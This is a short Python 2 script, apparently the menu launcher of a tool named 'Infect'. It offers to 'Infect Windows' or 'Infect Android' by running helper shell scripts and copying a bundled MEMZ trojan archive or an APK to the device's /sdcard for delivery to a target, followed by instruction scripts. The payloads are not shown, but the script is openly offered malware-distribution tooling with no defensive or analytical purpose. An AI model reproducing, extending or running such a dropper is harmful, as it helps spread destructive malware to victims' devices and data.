import requests
import os
import time
import random
import sys

os.system("clear")
os.system("cd && cd Infect && bash src/Logo.sh")

print("  \033[1;34m[1] >> \033[1;36;40mInfect Windows")
print("  \033[1;34m[2] >> \033[1;36;40mInfect Android")
print("  \033[1;34m[3] >> \033[1;36;40mExit Utility")

op=int(raw_input("1nfEct: "))

if(op==1):
 os.system("clear")
 os.system("cd && cd Infect && bash src/Inf.sh && cd Virus && cp memz-trojan.zip /sdcard/ && cd && bash Infect/src/Instruction.sh")
elif(op==2):
 os.system("clear")
 os.system("cd && cd Infect && bash src/Inf1.sh && cd Virus && cp VirtualXposed.apk /sdcard/ && cd && bash Infect/src/Instruction1.sh")
elif(op==3):
 time.sleep(0.2)
 print("\033[1;31;40mQuiting utility...")
 os.system("cd")
else:
 print("\033[1;31;40mInvalid input. Reloading Tool") 
 time.sleep(1.2)
 os.system("cd")
 os.system("cd Infect")
 os.system("python2 src/InfectMenu.py")
